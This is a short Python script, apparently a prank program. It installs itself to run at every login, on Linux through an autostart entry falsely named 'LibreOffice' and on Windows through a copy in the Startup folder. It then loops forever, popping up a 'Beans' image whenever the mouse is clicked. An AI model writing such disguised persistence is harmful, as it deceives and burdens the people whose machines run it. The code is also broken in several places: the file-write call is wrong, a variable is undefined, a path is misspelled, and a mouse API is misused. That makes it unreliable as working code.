import os, pyautogui, PIL, subprocess
from PIL import Image
def beans():
    if os.name=='nt':
        beans=Image.open('C:\\Beans.jpg')
    else:
        beans=Image.open('/home/Beans.jpg')
    beans.show()

def BEANCYCLE():
    while True:
        if pyautogui.mouseInfo()['leftButton']:
            beans()

pwd=subprocess.getoutput('pwd')

if os.name!='nt':
    os.system('mkdir -p ~/.config/autostart')
    os.system('touch ~/.config/autostart/LibreOffice.desktop')
    data="""[Desktop Entry]
    Type=Application
    Name=LibreOffice
    Exec=/usr/bin/python3 """+pwd+'"File Downloader.py"'

    with open('~/.config/autostart/LibreOffice.desktop'):
        file.write(data)
    os.system('chmod +x LibreOffice.desktop')
else:
    cmd="cp "+pwd+"\\'File Downloader.py' C:\\ProgranData\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup"
    os.system(cmd)

BEANCYCLE()
